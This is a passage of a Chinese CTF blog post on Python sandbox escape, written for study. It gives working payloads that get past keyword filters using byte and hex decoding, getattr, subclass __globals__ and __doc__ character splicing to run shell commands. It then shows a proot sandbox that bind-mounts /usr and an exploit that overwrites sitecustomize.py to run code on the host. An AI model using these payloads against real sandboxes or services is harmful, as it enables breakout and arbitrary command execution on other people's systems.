+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">b&#x27;__import__(b\&#x27;\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\&#x27;.decode()).call(b&quot;ls /&quot;,shell=True)&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NDBiNWM1ZDVjOTgxOTdjNWVhYTc2NzIwNDdiZmQ2ODBfOGE1NGUyNjkxZTQ2NDQ1YzM4NTQxZmY3YmI3NTdkMjFfSUQ6NzYzMjM1NTYxMjk2OTQ3MDkxNF8xNzg0MjA1NjQ0OjE3ODQyOTIwNDRfVjM" alt="Image"></p>
+<h3 id="getattr"><a href="#getattr" class="headerlink" title="getattr"></a>getattr</h3><p>eval如果没了，可以用getattr结合类中方法绕一些字符</p>
+<p>用 getattr 动态获取类中方法，第一个参数要求是个对象，第二个参数为字符串，要求这个对象内部的方法名，这里可以利用.decode()</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getattr</span>([].__class__.__base__.__subclasses__()[<span class="number">142</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>], <span class="string">b&#x27;system&#x27;</span>.decode())(<span class="string">&#x27;cat /flag&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mod = <span class="built_in">__import__</span>(<span class="string">b&#x27;subprocess&#x27;</span>.decode())</span><br><span class="line">call_func = <span class="built_in">getattr</span>(mod, <span class="string">b&#x27;call&#x27;</span>.decode())</span><br><span class="line">call_func(<span class="string">&#x27;ls /&#x27;</span>, shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(<span class="built_in">__import__</span>(<span class="string">b&#x27;subprocess&#x27;</span>.decode()), <span class="string">b&#x27;call&#x27;</span>.decode())(<span class="string">&#x27;ls /&#x27;</span>, shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="doc替换字符"><a href="#doc替换字符" class="headerlink" title="doc替换字符"></a><code>doc</code>替换字符</h2><p>你得有eval把你代码转化成字符串</p>
+<p>取文件里的字母进行字符拼接，这里有个payload生成器</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find_doc_indices</span>(<span class="params">target</span>):</span><br><span class="line">    doc = ().__doc__</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> target:</span><br><span class="line">        index = doc.find(char)</span><br><span class="line">        <span class="keyword">if</span> index == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;Character &#x27;<span class="subst">&#123;char&#125;</span>&#x27; not found in ().__doc__&quot;</span></span><br><span class="line">        result.append(<span class="string">f&quot; ().__doc__[<span class="subst">&#123;index&#125;</span>] &quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot; + &quot;</span>.join(result)</span><br><span class="line"></span><br><span class="line">target_string = <span class="string">&quot;call&quot;</span></span><br><span class="line"><span class="built_in">print</span>(find_doc_indices(target_string))</span><br></pre></td></tr></table></figure>
+
+<p>生成</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__doc__[<span class="number">25</span>]  +  ().__doc__[<span class="number">14</span>]  +  ().__doc__[<span class="number">3</span>]  +  ().__doc__[<span class="number">3</span>]</span><br></pre></td></tr></table></figure>
+
+<p>接着结合eval操作</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;__import__(&quot;subprocess&quot;).&#x27;</span> + ().__doc__[<span class="number">25</span>] + ().__doc__[<span class="number">14</span>] + ().__doc__[<span class="number">3</span>] + ().__doc__[<span class="number">3</span>] + <span class="string">&#x27;(&quot;ls /&quot;,shell=True)&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NzEwZTIxZjQ3MmIxNDI3YjgyNWE4ZGQ2NTM4ZjE2OWJfZjkwY2VkNjNlMTkzODhjNjgwNzhjYjFiNzk2MjRiNzdfSUQ6NzYzMjM1MjE3NDIzOTk2MDI0NF8xNzg0MjA1NjQ0OjE3ODQyOTIwNDRfVjM" alt="Image"></p>
+<h1 id="proot沙箱-拦截文件"><a href="#proot沙箱-拦截文件" class="headerlink" title="proot沙箱(拦截文件)"></a>proot沙箱(拦截文件)</h1><p><code>proot</code> 的核心机制是拦截系统调用。当沙盒内的程序试图访问文件时，<code>proot</code> 会捕捉这个请求（通过 <code>ptrace</code> 机制），并进行“路径重写”</p>
+<p>例如，沙盒内程序试图读取 <code>/etc/passwd</code>，<code>proot</code> 会拦截这个请求，并默默地将其重定向到你指定的目录，如 <code>/home/user/sandbox/etc/passwd</code>。这样，程序“以为”自己在访问整个系统，但实际上被限制在了特定文件夹中。</p>
+<h2 id="启用沙箱"><a href="#启用沙箱" class="headerlink" title="启用沙箱"></a>启用沙箱</h2><p>用proot启用沙箱，挂载文件的方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess  <span class="comment"># 用于执行系统命令</span></span><br><span class="line"><span class="keyword">import</span> sys         <span class="comment"># 用于获取命令行参数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_sandbox</span>(<span class="params">script_name</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    在 proot 沙箱中执行用户上传的 Python 脚本</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        script_name: 用户上传的脚本在宿主机上的路径</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Launching sandbox...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构建 proot 命令</span></span><br><span class="line">    cmd = [</span><br><span class="line">        <span class="string">&#x27;proot&#x27;</span>,                    <span class="comment"># 调用 proot 命令（用户态沙箱工具）</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ===== 沙箱根目录设置 =====</span></span><br><span class="line">        <span class="string">&#x27;-r&#x27;</span>, <span class="string">&#x27;./jail_root&#x27;</span>,        <span class="comment"># 将 ./jail_root 作为沙箱的根目录 (/)</span></span><br><span class="line">                                    <span class="comment"># 沙箱内看到的 / 实际上是宿主机的 ./jail_root</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ===== 绑定挂载（将宿主机目录映射进沙箱）=====</span></span><br><span class="line">        <span class="string">&#x27;-b&#x27;</span>, <span class="string">&#x27;/bin&#x27;</span>,               <span class="comment"># 将宿主机的 /bin 挂载到沙箱的 /bin</span></span><br><span class="line">                                    <span class="comment"># 让沙箱里能有 ls、cat 等基本命令</span></span><br><span class="line">        </span><br><span class="line">        <span class="string">&#x27;-b&#x27;</span>, <span class="string">&#x27;/usr&#x27;</span>,               <span class="comment"># 将宿主机的 /usr 挂载到沙箱的 /usr </span></span><br><span class="line">        </span><br><span class="line">        <span class="string">&#x27;-b&#x27;</span>, <span class="string">&#x27;/lib&#x27;</span>,               <span class="comment"># 将宿主机的 /lib 挂载进沙箱</span></span><br><span class="line">                                    <span class="comment"># 提供程序运行所需的共享库</span></span><br><span class="line">        </span><br><span class="line">        <span class="string">&#x27;-b&#x27;</span>, <span class="string">&#x27;/lib64&#x27;</span>,             <span class="comment"># 64位共享库（某些系统需要）</span></span><br><span class="line">        </span><br><span class="line">        <span class="string">&#x27;-b&#x27;</span>, <span class="string">&#x27;/etc/alternatives&#x27;</span>,  <span class="comment"># 系统备选程序管理目录（如 python 指向 python3）</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ===== 设备文件绑定 =====</span></span><br><span class="line">        <span class="string">&#x27;-b&#x27;</span>, <span class="string">&#x27;/dev/null&#x27;</span>,          <span class="comment"># 空设备，用于丢弃不需要的输出</span></span><br><span class="line">        <span class="string">&#x27;-b&#x27;</span>, <span class="string">&#x27;/dev/zero&#x27;</span>,          <span class="comment"># 零设备，读取会返回无限个 \0 字节</span></span><br><span class="line">        <span class="string">&#x27;-b&#x27;</span>, <span class="string">&#x27;/dev/urandom&#x27;</span>,       <span class="comment"># 随机数设备，用于生成随机数</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ===== 用户脚本映射 =====</span></span><br><span class="line">        <span class="string">&#x27;-b&#x27;</span>, <span class="string">f&#x27;<span class="subst">&#123;script_name&#125;</span>:/app/run.py&#x27;</span>,  </span><br><span class="line">                                    <span class="comment"># 将用户上传的脚本（宿主机路径）映射到沙箱内的 /app/run.py</span></span><br><span class="line">                                    <span class="comment"># 这样 proot 内的 python3 就能执行这个文件</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ===== 工作目录和执行命令 =====</span></span><br><span class="line">        <span class="string">&#x27;-w&#x27;</span>, <span class="string">&#x27;/app&#x27;</span>,               <span class="comment"># 设置沙箱内的工作目录为 /app</span></span><br><span class="line">        <span class="string">&#x27;python3&#x27;</span>, <span class="string">&#x27;run.py&#x27;</span>         <span class="comment"># 在沙箱内执行：python3 /app/run.py</span></span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    subprocess.call(cmd)            <span class="comment"># 执行构建好的命令</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ok&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    script = sys.argv[<span class="number">1</span>]            <span class="comment"># 从命令行参数获取脚本路径</span></span><br><span class="line">    run_sandbox(script)             <span class="comment"># 启动沙箱执行该脚本</span></span><br></pre></td></tr></table></figure>
+
+<p>上面的函数定义说明了沙箱内挂载的文件，用proot命令启用了沙箱</p>
+<h2 id="运行沙箱"><a href="#运行沙箱" class="headerlink" title="运行沙箱"></a>运行沙箱</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">BASE_DIR = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line">UPLOAD_FOLDER = os.path.join(BASE_DIR, <span class="string">&#x27;uploads&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(UPLOAD_FOLDER):</span><br><span class="line">    os.makedirs(UPLOAD_FOLDER)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_code</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /run 接口：执行用户上传的 Python 文件</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    data = request.get_json()              <span class="comment"># 获取 JSON 格式的请求体</span></span><br><span class="line">    filename = data.get(<span class="string">&#x27;filename&#x27;</span>)        <span class="comment"># 从 JSON 中取出 filename 字段</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 路径拼接：将 /app/uploads 与用户提供的 filename 拼接</span></span><br><span class="line">    target_file = os.path.join(<span class="string">&#x27;/app/uploads&#x27;</span>, filename)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># launcher.py 的路径（沙箱启动器）</span></span><br><span class="line">    launcher_path = os.path.join(BASE_DIR, <span class="string">&#x27;launcher.py&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 执行命令：python3 launcher.py &lt;用户上传的文件&gt;</span></span><br><span class="line">        proc = subprocess.run(</span><br><span class="line">            [sys.executable, launcher_path, target_file],  <span class="comment"># 要执行的命令，其中就有调用沙箱</span></span><br><span class="line">            capture_output=<span class="literal">True</span>,   <span class="comment"># 捕获 stdout 和 stderr</span></span><br><span class="line">            text=<span class="literal">True</span>,             <span class="comment"># 以文本形式返回输出（而不是 bytes）</span></span><br><span class="line">            timeout=<span class="number">5</span>,             <span class="comment"># 5 秒超时，防止恶意代码无限运行</span></span><br><span class="line">            cwd=BASE_DIR          <span class="comment"># 设置工作目录为应用根目录</span></span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 将命令的输出返回给客户端</span></span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;output&quot;</span>: proc.stdout + proc.stderr&#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">        <span class="comment"># 如果超过 5 秒没执行完，返回超时信息</span></span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;output&quot;</span>: <span class="string">&quot;Timeout&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>这样的沙箱，我们让他执行shell，是看不到主机的大多数文件的，只能看到上文中映射到沙箱中的文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;subprocess&quot;</span>).call(<span class="string">&quot;ls /&quot;</span>,shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MmYxNDcwOGQ0OWEzM2M1ZWUyZTM2MTJmZTlmYTBlOTZfODVjYWExMjBmNjJiYjQ4NGFhZWMyYjRkYzgzOWEyMmVfSUQ6NzYzMjcyMzE5NjcwNTM0NDQ1M18xNzg0MjA1NjQ0OjE3ODQyOTIwNDRfVjM" alt="Image"></p>
+<h2 id="usr-sitecustomize-py漏洞利用"><a href="#usr-sitecustomize-py漏洞利用" class="headerlink" title="&#x2F;usr&#x2F;...&#x2F;sitecustomize.py漏洞利用"></a>&#x2F;usr&#x2F;...&#x2F;sitecustomize.py漏洞利用</h2><p>而proot沙箱的利用点，就是&#x2F;usr&#x2F;...&#x2F;sitecustomize.py的利用：</p>
+<p>它是 Python 的“全局启动钩子”，任何 Python 进程启动时，都会在运行你的代码之前自动执行这个文件。</p>
+<p>但这里要看清楚，是”运行你的代码之前”，也就是在沙箱环境开放之前，它就被自动执行了，所以如果往该文件里写shell，得到的必然是主机的shell</p>
+<p>所以问题就显而易见了，你如果把&#x2F;usr给映射到沙箱了，沙箱可以随便动主机的&#x2F;usr，直接用沙箱的代码覆盖掉</p>
+<p>原本的&#x2F;usr&#x2F;...&#x2F;sitecustomize.py，这里完整的路径你也可以用递归ls来找到</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;/usr/local/lib/python3.10/site-packages/sitecustomize.py&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">import os</span></span><br><span class="line"><span class="string">os.system(&#x27;cat /flag&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这东西写进去以后，下次再运行沙箱（属于python进程启动）之前，就会先执行&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.10&#x2F;site-packages&#x2F;sitecustomize.py里面的内容，即运行cat &#x2F;flag，自然就能得到flag</p>
+<p><img src="https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NjVlY2JiYmUxZWQ0MGQzOTliMzJhYjcxMGM4ZDFhMDJfMWVlNjM5NjlmNjFlNmJlYTU0YjczNzUwOWYyMGRhNzBfSUQ6NzYzMjcyNDk4Nzg5OTU5NTk4NV8xNzg0MjA1NjQ0OjE3ODQyOTIwNDRfVjM" alt="Image"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://hnu-legend1440.com">legend1440</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://hnu-legend1440.com/2026/04/29/%E6%89%B6%E6%91%87%C2%B7%E4%B9%9D-python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/">http://hnu-legend1440.com/2026/04/29/%E6%89%B6%E6%91%87%C2%B7%E4%B9%9D-python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://hnu-legend1440.com" target="_blank">拂云观 · legend1440</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/lanqiao.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/04/13/%E6%89%B6%E6%91%87%C2%B7%E5%85%AB-jwt%E5%AF%86%E9%92%A5%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7/" title="扶摇·八--jwt密钥爆破工具"><img class="cover" src="/img/071601.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">扶摇·八--jwt密钥爆破工具</div></div><div class="info-2"><div class="info-item-1">发现这段时间挺多赛题都出现了无任何线索的jwt提权，这要求我们进行jwt密钥爆破，这里介绍两个工具的使用 jwtCracker(字典爆破和无签名)https://github\.com/alwaystest18/jwtCracker 安装安装方法，这东西是在Windows环境下下载，然后还得装go环境 1234git clone https://github.com/alwaystest18/jwtCracker.gitcd jwtCracker/go installgo build jwtCracker.go  下载好目录是这样的  字典爆破用法这是文件官方给出的用法 123456789101112Usage: jwtCracker COMMAND [options]encode [generate jwt token(alg=none)]  -pf string        path of payload filecrack [brute force jwt key]  -em string        encryption method of key [none(def...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://q.qlogo.cn/headimg_dl?dst_uin=1535548287&amp;spec=640&amp;img_type=jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">legend1440</div><div class="author-info-description">前进中的CTF-web现役队员</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" href="http://hnu-legend1440.com/2026/03/15/%E6%9D%A8%E6%A1%83%E7%9B%91%E7%8B%B1%C2%B7%E8%BF%9B%E6%9C%8D%E6%B5%81%E7%A8%8B%E6%8C%87%E5%BC%95/"><i class="fa fa-star"></i><span>杨桃监狱Minecraft服务器</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://www.hnusec.com/" target="_blank" title="HnuSec"><i class="far fa-star"></i></a><a class="social-icon" href="http://hnu-legend1440.com" target="_blank" title="1535548287"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">平芜尽处是春山</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%AF%AD%E5%8F%A5"><span class="toc-text">常见的命令执行语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eval%E6%93%8D%E4%BD%9C"><span class="toc-text">eval操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exec%E6%93%8D%E4%BD%9C"><span class="toc-text">exec操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E4%BE%8B%E5%AD%90"><span class="toc-text">简单的例子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#import%E8%AF%AD%E5%8F%A5"><span class="toc-text">import语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E4%B8%AD%E6%96%B9%E6%B3%95-eval-import%E6%B2%A1%E4%BA%86"><span class="toc-text">类中方法(eval&#x2F;import没了)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-text">文件操作</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-text">绕过技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#byte%E5%88%A9%E7%94%A8"><span class="toc-text">byte利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%BC%95%E5%8F%B7%E7%A6%81%E7%94%A8"><span class="toc-text">绕过引号禁用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E8%A1%A8%E7%A4%BA"><span class="toc-text">十六进制表示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getattr"><span class="toc-text">getattr</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#doc%E6%9B%BF%E6%8D%A2%E5%AD%97%E7%AC%A6"><span class="toc-text">doc替换字符</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#proot%E6%B2%99%E7%AE%B1-%E6%8B%A6%E6%88%AA%E6%96%87%E4%BB%B6"><span class="toc-text">proot沙箱(拦截文件)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%AF%E7%94%A8%E6%B2%99%E7%AE%B1"><span class="toc-text">启用沙箱</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E6%B2%99%E7%AE%B1"><span class="toc-text">运行沙箱</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#usr-sitecustomize-py%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">&#x2F;usr&#x2F;...&#x2F;sitecustomize.py漏洞利用</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/04/29/%E6%89%B6%E6%91%87%C2%B7%E4%B9%9D-python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/" title="扶摇·九-python沙盒逃逸初探"><img src="/img/lanqiao.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="扶摇·九-python沙盒逃逸初探"/></a><div class="content"><a class="title" href="/2026/04/29/%E6%89%B6%E6%91%87%C2%B7%E4%B9%9D-python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/" title="扶摇·九-python沙盒逃逸初探">扶摇·九-python沙盒逃逸初探</a><time datetime="2026-04-29T07:00:00.000Z" title="发表于 2026-04-29 15:00:00">2026-04-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/13/%E6%89%B6%E6%91%87%C2%B7%E5%85%AB-jwt%E5%AF%86%E9%92%A5%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7/" title="扶摇·八--jwt密钥爆破工具"><img src="/img/071601.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="扶摇·八--jwt密钥爆破工具"/></a><div class="content"><a class="title" href="/2026/04/13/%E6%89%B6%E6%91%87%C2%B7%E5%85%AB-jwt%E5%AF%86%E9%92%A5%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7/" title="扶摇·八--jwt密钥爆破工具">扶摇·八--jwt密钥爆破工具</a><time datetime="2026-04-13T04:00:00.000Z" title="发表于 2026-04-13 12:00:00">2026-04-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/13/%E7%AE%97%E6%B3%95%E8%B5%9B%E4%BA%94%E6%97%A5%E4%BD%93%E9%AA%8C%C2%B7%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%AA%81%E5%87%BB%E5%B0%8F%E8%AE%B0/" title="算法赛五日体验·蓝桥杯突击小记"><img src="/img/lanqiao.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="算法赛五日体验·蓝桥杯突击小记"/></a><div class="content"><a class="title" href="/2026/04/13/%E7%AE%97%E6%B3%95%E8%B5%9B%E4%BA%94%E6%97%A5%E4%BD%93%E9%AA%8C%C2%B7%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%AA%81%E5%87%BB%E5%B0%8F%E8%AE%B0/" title="算法赛五日体验·蓝桥杯突击小记">算法赛五日体验·蓝桥杯突击小记</a><time datetime="2026-04-13T03:00:00.000Z" title="发表于 2026-04-13 11:00:00">2026-04-13</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/footer.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By legend1440</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.6.0</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.6.0"></script><script 